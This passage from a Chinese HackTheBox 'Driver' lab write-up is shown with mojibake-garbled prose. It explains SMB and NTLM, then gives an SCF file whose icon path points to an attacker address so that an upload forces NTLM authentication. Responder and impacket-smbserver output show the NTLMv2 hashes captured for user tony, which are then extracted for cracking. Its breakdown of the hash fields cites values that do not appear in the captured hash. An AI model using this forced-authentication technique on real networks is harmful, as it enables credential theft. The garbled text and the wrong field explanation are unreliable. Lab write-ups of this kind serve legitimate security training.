<li><p><code>SMB</code>ï¼šSMBï¼ˆServer Message Blockï¼‰æ˜¯â¼€ç§åœ¨â½¹ç»œä¸Šâ½¤äºâ½‚ä»¶å…±äº«ã€æ‰“å°æœåŠ¡å’Œå…¶ä»–â½¹ç»œé€šä¿¡çš„åº”â½¤å±‚åè®®ã€‚æœ€åˆç”±IBMå¼€å‘å¹¶ç”±Microsoftè¿›â¼€æ­¥æ‰©å±•ï¼ŒSMBåè®®ä½¿è®¡ç®—æœºèƒ½å¤Ÿåœ¨å±€åŸŸâ½¹ï¼ˆLANï¼‰ä¸­è®¿é—®â½‚ä»¶ã€æ‰“å°æœºã€ä¸²â¾ç«¯â¼å’Œé€šä¿¡ã€‚éšç€æŠ€æœ¯çš„å‘å±•ï¼ŒSMBåè®®ç»å†äº†å¤šæ¬¡é‡è¦çš„æ›´æ–°ï¼ŒåŒ…æ‹¬SMB 1.0ã€SMB 2.0ã€SMB 2.1ã€SMB 3.0å’Œæœ€æ–°çš„SMB 3.1.1ã€‚æ¯ä¸ªç‰ˆæœ¬éƒ½åœ¨æ€§èƒ½ã€æ•ˆç‡å’Œå®‰å…¨æ€§â½…â¾¯è¿›â¾äº†æ”¹è¿›ï¼Œå°¤å…¶æ˜¯ä»SMB 2.0å¼€å§‹ï¼Œæ˜¾è‘—å¢åŠ äº†å¯¹â¼¤å‹â½‚ä»¶çš„ä¼ è¾“é€Ÿåº¦å’Œå‡å°‘äº†â½¹ç»œå»¶è¿Ÿã€‚SMBåè®®â½€æŒå¤šç§è®¤è¯â½…æ³•ï¼Œä¸»è¦çš„åŒ…æ‹¬<strong>NTLMï¼ˆNT LAN Managerï¼‰</strong>å’Œ<strong>Kerberos</strong>ã€‚<strong>NTLMæ˜¯â¼€ç§æŒ‘æˆ˜&#x2F;å“åº”è®¤è¯åè®®</strong>ï¼Œâ¼´æ³›â½¤äºæ²¡æœ‰Active Directoryçš„ç¯å¢ƒã€‚å®ƒé€šè¿‡ä¸ç›´æ¥åœ¨â½¹ç»œä¸­ä¼ è¾“â½¤æˆ·çš„å¯†ç ï¼Œâ½½æ˜¯<strong>ä½¿â½¤å¯†ç çš„æ•£åˆ—å€¼æ¥å®Œæˆè®¤è¯</strong>ï¼Œæä¾›äº†åŸºæœ¬çš„å®‰å…¨ä¿éšœã€‚â½½åœ¨Active Directoryç¯å¢ƒä¸­ï¼ŒKerberosæˆä¸ºâ¾¸é€‰çš„è®¤è¯â½…æ³•ã€‚</p>
</li>
</ul>
<p>å½“ç„¶åœ¨æ‰“è¿™ä¸ªé¶åœºçš„è¿‡ç¨‹ä¸­ï¼šè¿˜è®©æˆ‘äº†è§£åˆ°<code>å—…æ¢</code>è¿™å›äº‹ï¼š</p>
<p>çŸ¥é“æ€ä¹ˆå—…æ¢ï¼Œæœ‰â¼¯å…·å¯â½¤ï¼Œ<code>å†…â½¹å—…æ¢</code>è‘—åçš„æ˜¯<code>responder</code>ã€‚Responder å¯ä»¥å¯¹æ¥æ”¶åˆ°çš„NTLMè®¤è¯å°è¯•è¿›â¾<strong>ä¸­é—´â¼ˆæ”»å‡»ï¼ˆMITMï¼‰</strong>ï¼Œ<strong>é€šè¿‡å‘è¯·æ±‚è€…å‘é€ä¼ªé€ çš„NTLMæŒ‘æˆ˜æ¥è·å–NTLMå“åº”</strong>ã€‚è¿™ä¸ªå“åº”åŒ…å«äº†<code>åŠ å¯†åçš„â½¤æˆ·å‡­æ®çš„æ•£åˆ—å€¼</code>ã€‚Responder ä¸ç›´æ¥è§£å¯†è¿™äº›æ•£åˆ—å€¼ï¼›â½½æ˜¯<strong>é‡‡é›†è¿™äº›æ•°æ®</strong>ï¼Œä»¥ä¾¿<strong>é€šè¿‡ç¦»çº¿æ”»å‡»è§£ç è¿™äº›æ•£åˆ—</strong>ã€‚Windowsä¸‹æœ‰<code>inveigh</code>è¿™ä¸ªæ›¿ä»£å“ã€‚</p>
<p>æœ€åè¿˜è¦è§£å†³â¼€ä¸ªé—®é¢˜ï¼Œåœ¨è¿™æ ·çš„åœºæ™¯ä¸‹<strong>æœ‰è§¦å‘ntlmè®¤è¯çš„â¼¿æ®µå—ï¼Ÿ</strong>å°±æ˜¯åœ¨smbåº”â½¤å†…å‘èµ·æŸä¸ªè®¿é—®ï¼Œè§¦å‘è®¤è¯ï¼Œè®©responderèƒ½æœ‰â½¤æ­¦ä¹‹åœ°ï¼Œä½œä¸ºä¸­é—´â¼ˆæ”»å‡»çš„å‘èµ·è€…ï¼Œ<strong>ä½†æ€»å¾—æœ‰æµé‡å•Š</strong>ï¼ï¼ï¼</p>
<p>Payloadè¦ä¼ ä¸Šå»ï¼Œè¿™å¥½åƒä¸éš¾ï¼Œçœ‹åˆ°driver.htbçš„ä¸Šä¼ â»šâ¾¯æ²¡æœ‰åšå¾ˆå¤šé™åˆ¶ï¼Œè²Œä¼¼å„ç±»å‹â½‚ä»¶éƒ½å¯ä»¥ä¸Šä¼ ã€‚ä½†<strong>æ€ä¹ˆè§¦å‘æŸç§è®¿é—®ï¼Œè¿›â½½è§¦å‘ntlmè®¤è¯ï¼Ÿ</strong>è¿™â¾¥è¦â½¤åˆ°<code>scfâ½‚ä»¶</code>ï¼Œä½ å¯ä»¥åœ¨baiduä¸­çœ‹åˆ°è¿™ç§â½‚ä»¶ç±»å‹çš„ä»‹ç»<code>[explorer.scf_ç™¾åº¦ç™¾ç§‘](https://baike.baidu.com/item/explorer.scf)</code></p>
<p>æ€»è€Œè¨€ä¹‹ï¼Œ<code>SCFâ½‚ä»¶</code>æ˜¯â¼€ç§Windows Shell â½‚ä»¶ï¼Œâ½¤äºæ‰§â¾ç‰¹å®šçš„ç³»ç»Ÿå‘½ä»¤ã€‚è¿™ç§â½‚ä»¶æ ¼å¼è™½ç„¶ä¸å¤ªå¸¸â»…ï¼Œä½†åŠŸèƒ½å¾ˆå¯¹æˆ‘ä»¬æ¸—é€æµ‹è¯•çš„åº”ç”¨ï¼Œå¯ä»¥â½¤æ¥â¾ƒåŠ¨åŒ–æŸäº›ä¸Windowsèµ„æºç®¡ç†å™¨äº¤äº’çš„ä»»åŠ¡ï¼Œä¾‹å¦‚æ‰“å¼€ç‰¹å®šçš„ç³»ç»Ÿâ¼¯å…·æˆ–æ§åˆ¶èµ„æºç®¡ç†å™¨çš„â¾ä¸ºã€‚SCF â½‚ä»¶æ˜¯çº¯â½‚æœ¬â½‚ä»¶ï¼Œå¯ä»¥ä½¿â½¤ä»»ä½•â½‚æœ¬ç¼–è¾‘å™¨åˆ›å»ºå’Œç¼–è¾‘ã€‚â½‚ä»¶å†…å®¹å®šä¹‰äº†è¦æ‰§â¾çš„å‘½ä»¤ï¼Œä»¥åŠå¯èƒ½çš„â¼€äº›å‚æ•°è®¾ç½®ã€‚ä»ç™¾åº¦è¯æ¡ä¸­ï¼Œæˆ‘ä»¬ç¼–è¾‘â¼€ä¸ªSCFâ½‚ä»¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=explorer.exe,1</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=Explorer</span><br></pre></td></tr></table></figure>

<p>å®ƒèƒ½æ‰§â¾ç³»ç»Ÿå‘½ä»¤ï¼Œç«™åœ¨æ¸—é€æµ‹è¯•è§†â»†æ¥çœ‹ï¼Œç»“åˆå½“å‰çš„å¤„å¢ƒã€åœºæ™¯å’Œèƒ½â¼’ã€‚æ—¢ç„¶<strong>å®ƒèƒ½è§¦å‘ç³»ç»Ÿå‘½ä»¤</strong>ï¼Œé‚£å°±è®¿é—®â¼€ä¸ªsmbä½ç½®ï¼Œä¸å­˜åœ¨çš„ä½ç½®ï¼Œè¿™æ ·<strong>å°±èƒ½å¯¼è‡´è§£æåè®®é™çº§åˆ°nbt-nsæˆ–llmnr</strong>ï¼Œè¿™æ ·å°±æœ‰å¯èƒ½è§¦å‘ntlmè®¤è¯ï¼Œæˆ‘ä»¬å°±å¯èƒ½åšåˆ°responderçš„mitmï¼Œä¹Ÿå°±æ˜¯ä¸­é—´â¼ˆæ”»å‡»ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">cat</span> test.scf </span><br><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.16.9\redteamnotes</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=Explorer</span><br></pre></td></tr></table></figure>

<p>æ„æƒ³åˆ°å°è¯•åˆ°â½…æ¡ˆï¼Œç”šâ¾„å®ç°éƒ½æœ‰äº†ï¼Œåšå‡ºå°è¯•ã€‚</p>
<p><code>crackmapexec</code>æˆ–<code>nxc</code>æœ‰è‡ªåŠ¨åŒ–çš„æ”»å‡»æœ‰æ¶‰åŠåˆ°ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/aptlabs]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> nxc smb -L | grep slinky</span><br><span class="line">[*] slinky Creates windows shortcuts with the icon</span><br><span class="line">attribute containing a UNC path to the specified SMB server <span class="keyword">in</span> all shares with</span><br><span class="line">write permissions</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨æ–‡ç« ï¼š(<a target="_blank" rel="noopener" href="https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-slinky">https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-slinky</a>)</p>
<h4 id="smbå…±äº«scfâ½‚ä»¶æ”»å‡»"><a href="#smbå…±äº«scfâ½‚ä»¶æ”»å‡»" class="headerlink" title="smbå…±äº«scfâ½‚ä»¶æ”»å‡»"></a>smb<strong>å…±äº«</strong>scfâ½‚ä»¶æ”»å‡»</h4><p>ç¡®å®šâ½¹å¡å<code>tun0</code>ï¼Œç„¶åå¯åŠ¨responderç›‘å¬ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ ip a </span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group</span><br><span class="line">default qlen 1000</span><br><span class="line"> <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line"> inet 127.0.0.1/8 scope host lo</span><br><span class="line"> valid_lft forever preferred_lft forever</span><br><span class="line"> inet6 ::1/128 scope host noprefixroute </span><br><span class="line"> valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP</span><br><span class="line">group default qlen 1000</span><br><span class="line"> <span class="built_in">link</span>/ether 00:0c:29:67:78:15 brd ff:ff:ff:ff:ff:ff</span><br><span class="line"> inet 172.16.94.128/24 brd 172.16.94.255 scope global dynamic noprefixroute</span><br><span class="line">eth0</span><br><span class="line"> valid_lft 1420sec preferred_lft 1420sec</span><br><span class="line"> inet6 fe80::84f7:88a9:9ab1:214d/64 scope <span class="built_in">link</span> noprefixroute </span><br><span class="line"> valid_lft forever preferred_lft forever</span><br><span class="line">12: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel</span><br><span class="line">state UNKNOWN group default qlen 500</span><br><span class="line"> <span class="built_in">link</span>/none </span><br><span class="line"> inet 10.10.16.9/23 scope global tun0</span><br><span class="line"> valid_lft forever preferred_lft forever</span><br><span class="line"> inet6 dead:beef:4::1007/64 scope global </span><br><span class="line"> valid_lft forever preferred_lft forever</span><br><span class="line"> inet6 fe80::6404:9b56:ebd4:d95/64 scope <span class="built_in">link</span> stable-privacy proto</span><br><span class="line">kernel_ll </span><br><span class="line"> valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>tun0</code>â½¹å¡ä¸Šå¯åŠ¨responderï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> responder -I tun0 -v __</span><br><span class="line"> .----.-----.-----.-----.-----.-----.--| |.-----.----.</span><br><span class="line"> | _| -__|__ --| _ | _ | | _ || -__| _|</span><br><span class="line"> |__| |_____|_____| __|_____|__|__|_____||_____|__|</span><br><span class="line"> |__|</span><br><span class="line"> NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0</span><br><span class="line"> To support this project:</span><br><span class="line"> Github -&gt; https://github.com/sponsors/lgandx</span><br><span class="line"> Paypal -&gt; https://paypal.me/PythonResponder</span><br><span class="line"> Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line"> To <span class="built_in">kill</span> this script hit CTRL-C</span><br><span class="line">[+] Poisoners:</span><br><span class="line"> LLMNR [ON]</span><br><span class="line"> NBT-NS [ON]</span><br><span class="line"> MDNS [ON]</span><br><span class="line"> DNS [ON]</span><br><span class="line"> DHCP [OFF]</span><br><span class="line">[+] Servers:</span><br><span class="line"> HTTP server [ON]</span><br><span class="line"> HTTPS server [ON]</span><br><span class="line"> WPAD proxy [OFF]</span><br><span class="line"> Auth proxy [OFF]</span><br><span class="line"> SMB server [ON]</span><br><span class="line"> Kerberos server [ON]</span><br><span class="line"> SQL server [ON]</span><br><span class="line"> FTP server [ON]</span><br><span class="line"> IMAP server [ON]</span><br><span class="line"> POP3 server [ON]</span><br><span class="line"> SMTP server [ON]</span><br><span class="line"> DNS server [ON]</span><br><span class="line"> LDAP server [ON]</span><br><span class="line"> MQTT server [ON]</span><br><span class="line"> RDP server [ON]</span><br><span class="line"> DCE-RPC server [ON]</span><br><span class="line"> WinRM server [ON]</span><br><span class="line"> SNMP server [OFF]</span><br><span class="line">[+] HTTP Options:</span><br><span class="line"> Always serving EXE [OFF]</span><br><span class="line"> Serving EXE [OFF]</span><br><span class="line"> Serving HTML [OFF]</span><br><span class="line"> Upstream Proxy [OFF]</span><br><span class="line">[+] Poisoning Options:</span><br><span class="line"> Analyze Mode [OFF]</span><br><span class="line"> Force WPAD auth [OFF]</span><br><span class="line"> Force Basic Auth [OFF]</span><br><span class="line"> Force LM downgrade [OFF]</span><br><span class="line"> Force ESS downgrade [OFF]</span><br><span class="line">[+] Generic Options:</span><br><span class="line"> Responder NIC [tun0]</span><br><span class="line"> Responder IP [10.10.16.9]</span><br><span class="line"> Responder IPv6 [dead:beef:4::1007]</span><br><span class="line"> Challenge <span class="built_in">set</span> [random]</span><br><span class="line"> Don<span class="string">&#x27;t Respond To Names [&#x27;</span>ISATAP<span class="string">&#x27;, &#x27;</span>ISATAP.LOCAL<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">[+] Current Session Variables:</span></span><br><span class="line"><span class="string"> Responder Machine Name [WIN-B87ERV8GOUE]</span></span><br><span class="line"><span class="string"> Responder Domain Name [SFNW.LOCAL]</span></span><br><span class="line"><span class="string"> Responder DCE-RPC Port [47745]</span></span><br><span class="line"><span class="string">[+] Listening for events...</span></span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨drvier.htbçš„ä¸Šä¼ â»šâ¾¯ä¸­ä¸Šä¼ scfâ½‚ä»¶ã€‚éšç€æäº¤å®Œæˆï¼Œå¾ˆå¿«æˆ‘ä»¬<strong>æ•æ‰åˆ°äº†æµé‡å’Œhash</strong>ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[+] Listening <span class="keyword">for</span> events...</span><br><span class="line">[SMB] NTLMv2-SSP Client : 10.129.40.36</span><br><span class="line">[SMB] NTLMv2-SSP Username : DRIVER\tony</span><br><span class="line">[SMB] NTLMv2-SSP Hash :</span><br><span class="line">tony::DRIVER:b558c4920db32a40:EDEFDDF5010502EB0BE3049977FD6CE0:010100000000000000B9E32944A5DA019005C2FBCD3E5D1A0000000002000800530046004E00570001001E00570049004E002D00420038003700450052005600380047004F005500450004003400570049004E002D00420038003700450052005600380047004F00550045002E00530046004E0057002E004C004F00430041004C0003001400530046004E0057002E004C004F00430041004C0005001400530046004E0057002E004C004F00430041004C000700080000B9E32944A5DA01060004000200000008003000300000000000000000000000002000003754E27C9803F40A182B2657EB8193AA5EB370597B636D83AE5AB2CE59E879CA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003900000000000000000000000000</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.çœç•¥</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">[SMB] NTLMv2-SSP Client : 10.129.40.36</span><br><span class="line">[SMB] NTLMv2-SSP Username : DRIVER\tony</span><br><span class="line">[SMB] NTLMv2-SSP Hash :</span><br><span class="line">tony::DRIVER:12430e8b200482bf:87E6078FDC62C2034CA53A176E141648:010100000000000000B9E32944A5DA01526894628D5AA73E0000000002000800530046004E00570001001E00570049004E002D00420038003700450052005600380047004F005500450004003400570049004E002D00420038003700450052005600380047004F00550045002E00530046004E0057002E004C004F00430041004C0003001400530046004E0057002E004C004F00430041004C0005001400530046004E0057002E004C004F00430041004C000700080000B9E32944A5DA01060004000200000008003000300000000000000000000000002000003754E27C9803F40A182B2657EB8193AA5EB370597B636D83AE5AB2CE59E879CA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003900000000000000000000000000</span><br><span class="line">[+] Exiting...</span><br></pre></td></tr></table></figure>

<h5 id="æ‰©å±•ï¼š"><a href="#æ‰©å±•ï¼š" class="headerlink" title="æ‰©å±•ï¼š"></a>æ‰©å±•ï¼š</h5><p>å…¶å®responderè¿™â¾¥ä¹Ÿå¯ä»¥â½¤<strong>smbserveræœåŠ¡å™¨æ›¿ä»£</strong>ï¼Œâ½å¦‚å…ˆå»ºâ½´â¼€ä¸ªå½“å‰â½¬å½•çš„å…±äº«ï¼Œå…±äº«åä¸ºtestï¼š</p>
<p>ç„¶åå°†ä¹‹å‰çš„scfâ½‚ä»¶é‡æ–°ä¸Šä¼ ï¼ŒåŒæ ·ä¹Ÿèƒ½çœ‹åˆ°smbserverçš„â½‡å¿—å·²ç»æ•æ‰åˆ°äº†ntlmv2å“ˆå¸Œã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> impacket-smbserver <span class="built_in">test</span> . -smb2support </span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Incoming connection (10.129.40.36,49594)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (DRIVER\tony,DRIVER)</span><br><span class="line">[*] User DRIVER\tony authenticated successfully</span><br><span class="line">[*]</span><br><span class="line">tony::DRIVER:aaaaaaaaaaaaaaaa:afda2e9608d11e16b53f1f35e75171a3:0101000000000000808bdae16fa5da01d201fa7c9015661300000000010010004a006900790078007600770056005600030010004a0069007900780076007700560056000200100050005900500067005900610056005400040010005000590050006700590061005600540007000800808bdae16fa5da01060004000200000008003000300000000000000000000000002000003754e27c9803f40a182b2657eb8193aa5eb370597b636d83ae5ab2ce59e879ca0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003900000000000000000000000000</span><br><span class="line">[*] Connecting Share(1:IPC$)</span><br><span class="line">[*] Connecting Share(2:redteamnotes)</span><br><span class="line">[*] Disconnecting Share(1:IPC$)</span><br><span class="line">[*] Disconnecting Share(2:redteamnotes)</span><br><span class="line">[*] Closing down connection (10.129.40.36,49594)</span><br></pre></td></tr></table></figure>



<p>ctrl+cç»“æŸæ‰responderå‘½ä»¤ï¼Œç„¶åæå–å‡ºå…¶ä¸­çš„hashï¼Œå­˜â¼Šdigestâ½‚ä»¶ä¸­ã€‚</p>
<p>è¿™â¾¥å¯åŠ¨responderçš„æ—¶å€™ï¼Œæˆ‘â½¤äº†-vå‚æ•°ï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºç°å¦‚ä¸‹æ•æ‰ååˆ’è¿‡æ•æ‰çš„çŠ¶æ€ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> responder -I tun0 </span><br><span class="line">......</span><br><span class="line">[*] Skipping previously captured <span class="built_in">hash</span> <span class="keyword">for</span> DRIVER\tony</span><br><span class="line">[*] Skipping previously captured <span class="built_in">hash</span> <span class="keyword">for</span> DRIVER\tony</span><br><span class="line">[*] Skipping previously captured <span class="built_in">hash</span> <span class="keyword">for</span> DRIVER\tony</span><br><span class="line">[+] Exiting...</span><br></pre></td></tr></table></figure>

<p>å…¶å®æ— ä¼¤å¤§é›…ï¼Œä¹Ÿå°±æ˜¯ä¸é‡å¤æ•æ‰â½½å·²ï¼Œä¹Ÿå¯ä»¥åœ¨kaliçš„ <code>/usr/share/responder/logs/ </code>çœ‹åˆ°å†å²è®°å½•ã€‚</p>
<h4 id="ç ´è§£NTLMv2å“ˆå¸Œ"><a href="#ç ´è§£NTLMv2å“ˆå¸Œ" class="headerlink" title="ç ´è§£NTLMv2å“ˆå¸Œ"></a>ç ´è§£<strong>NTLMv2</strong>å“ˆå¸Œ</h4><p>è®¤è¯†ä¸€æ‰‹è¿™å“¥ä»¬ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SMB] NTLMv2-SSP Client : 10.129.40.36</span><br><span class="line">[SMB] NTLMv2-SSP Username : DRIVER\tony</span><br><span class="line">[SMB] NTLMv2-SSP Hash :</span><br><span class="line">tony::DRIVER:b558c4920db32a40:EDEFDDF5010502EB0BE3049977FD6CE0:010100000000000000B9E32944A5DA019005C2FBCD3E5D1A0000000002000800530046004E00570001001E00570049004E002D00420038003700450052005600380047004F005500450004003400570049004E002D00420038003700450052005600380047004F00550045002E00530046004E0057002E004C004F00430041004C0003001400530046004E0057002E004C004F00430041004C0005001400530046004E0057002E004C004F00430041004C000700080000B9E32944A5DA01060004000200000008003000300000000000000000000000002000003754E27C9803F40A182B2657EB8193AA5EB370597B636D83AE5AB2CE59E879CA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003900000000000000000000000000</span><br></pre></td></tr></table></figure>

<p><code>tony::DRIVER</code>æ˜¯<code>â½¤æˆ·å’ŒåŸŸå</code>ï¼Œ<code>49bd74badf6a3323</code>æ˜¯<code>â½¤æˆ·å“ˆå¸Œ</code>ï¼ˆNTLMå“ˆå¸Œï¼‰ï¼Œ<code>C89102A376780EC97035160055778802</code>æ˜¯<code>æœåŠ¡å™¨æŒ‘æˆ˜</code>ï¼ˆChallengeï¼‰ï¼Œæœ€åâ¼€â»“ä¸²æ˜¯<code>â½¤æˆ·å“åº”</code>ï¼ˆResponseï¼‰ã€‚</p>
<p>æå–ä¸€ä¸‹å…¶ä¸­hashéƒ¨åˆ†ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ grep -o <span class="string">&#x27;tony::.*&#x27;</span> digest | <span class="built_in">tee</span> digest-only </span><br><span class="line">tony::DRIVER:b558c4920db32a40:EDEFDDF5010502EB0BE3049977FD6CE0:010100000000000000B9E32944A5DA019005C2FBCD3E5D1A0000000002000800530046004E00570001001E00570049004E002D00420038003700450052005600380047004F005500450004003400570049004E002D00420038003700450052005600380047004F00550045002E00530046004E0057002E004C004F00430041004C0003001400530046004E0057002E004C004F00430041004C0005001400530046004E0057002E004C004F00430041004C000700080000B9E32944A5DA01060004000200000008003000300000000000000000000000002000003754E27C9803F40A182B2657EB8193AA5EB370597B636D83AE5AB2CE59E879CA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003900000000000000000000000000</span><br><span class="line">tony::DRIVER:b4e90390151fb9cf:9C5536B86BE2CC1E4450B33AE0652DA3:010100000000000000B9E32944A5DA01835CA668D7A488860000000002000800530046004E00570001001E00570049004E002D00420038003700450052005600380047004F005500450004003400570049004E002D00420038003700450052005600380047004F00550045002E00530046004E0057002E004C004F00430041004C0003001400530046004E0057002E004C004F00430041004C0005001400530046004E0057002E004C004F00430041004C000700080000B9E32944A5DA01060004000200000008003000300000000000000000000000002000003754E27C9803F40A182B2657EB8193AA5EB370597B636D83AE5AB2CE59E879CA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003900000000000000000000000000</span><br><span class="line">tony::DRIVER:d1ef10087e82a7bb:4F1C96A969B8A4E19054D8E80160E028:010100000000000000B9E32944A5DA01521BA2EBA144813F0000000002000800530046004E00570001001E00570049004E002D00420038003700450052005600380047004F005500450004003400570049004E002D00420038003700450052005600380047004F00550045002E00530046004E0057002E004C004F00430041004C0003001400530046004E0057002E004C004F00430041004C0005001400530046004E0057002E004C004F00430041004C000700080000B9E32944A5DA01060004000200000008003000300000000000000000000000002000003754E27C9803F40A182B2657EB8193AA5EB370597B636D83AE5AB2CE59E879CA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003900000000000000000000000000</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„è§‚å¯Ÿæ¯æ¬¡çš„hashéƒ½ä¸åŒï¼š</p>
